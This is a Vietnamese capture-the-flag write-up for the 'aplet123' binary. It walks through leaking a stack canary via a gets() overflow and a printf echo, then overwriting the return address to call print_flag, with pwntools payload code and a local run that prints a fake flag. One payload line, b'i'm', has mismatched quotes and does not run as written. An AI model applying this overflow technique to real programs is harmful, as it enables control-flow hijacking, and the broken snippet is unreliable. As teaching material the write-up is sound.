# write up aplet 123 


- khi nhìn vào code hàm main em sẽ thấy có lỗi buffer overflow ở hàm gets, vì hàm dùng while lặp lại nhiều lần nên em có thể khai thác nhiều lần gets, ngoài ra còn có %s nữa nên em có thể dùng nó để leak canary vì chương trình có bật canary, vì bài có hàm lấy flag rồi nên không cần phải lấy shell nữa
```C
int main(void) {
  setbuf(stdout, NULL);
  srand(time(NULL));
  char input[64];
  puts("hello");
  while (1) {
    gets(input);
    char *s = strstr(input, "i'm");
    if (s) {
      printf("hi %s, i'm aplet123\n", s + 4);
    } else if (strcmp(input, "please give me the flag") == 0) {
      puts("i'll consider it");
      sleep(5);
      puts("no");
    } else if (strcmp(input, "bye") == 0) {
      puts("bye");
      break;
    } else {
      puts(responses[rand() % (sizeof responses / sizeof responses[0])]);
    }
  }
```
- đầu tiên em sẽ nhập đủ số bytes cộng với chuỗi "i'm" sao cho nó đến được với canary, căn sao cho s+4 không ảnh hưởng gì đến kết quả trả về 
```python
payload = b'a'*0x3e + b'a'*0x7
payload += b'i'm'
p.sendlineafter(b'hello\n',payload)
```
- phải thêm "i'm" ở cuối cùng vì strstr sẽ trả về con trỏ trỏ tới chuỗi i'm trong chuỗi vừa nhập thì if mới có thể chạy tiếp , nếu không strstr sẽ trả về null, ngoài ra nếu bỏ "i'm" ở đầu chuỗi thì lúc cuối chuỗi sẽ có null byte ngăn cách với canary nên không in ra được canary
```C
char *s = strstr(input, "i'm");
```

- sau khi leak xong canary thì quay trở lại và nhập lần nữa cùng với canary và địa chỉ hàm print_flag vào đúng vị trí

```python
canary_leak = u64(p.recv(7) + b'\x00')
payload = b'a'*0x48
payload += p8(0)
payload += p64(canary_leak)
payload += b'a'*0x7
payload += p64(exe.sym['print_flag'])
p.sendlineafter(b'aplet123\n',payload)

```
cuối cùng gõ bye để thoát khỏi vòng lặp và đi tới return để lấy flag 

```bash
[*] '/home/as/pwnable/report/aplet123/aplet123'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/as/pwnable/report/aplet123/aplet123': pid 121890
[*] Switching to interactive mode
so relatable
$ bye
bye
fake{lmaolmaolmao}

[*] Got EOF while reading in interactive
```
